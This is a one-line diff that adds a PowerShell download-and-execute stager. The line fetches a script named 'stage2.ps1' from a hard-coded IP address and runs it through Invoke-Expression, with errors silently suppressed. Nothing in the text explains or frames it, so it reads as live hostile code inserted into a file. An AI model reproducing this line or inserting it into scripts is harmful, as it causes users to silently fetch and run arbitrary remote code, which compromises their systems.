@@ -1,0 +1,1 @@
+$TransferUrl = 'http://192.0.2.250/stage2.ps1'; IEX (Invoke-WebRequest -Uri $TransferUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
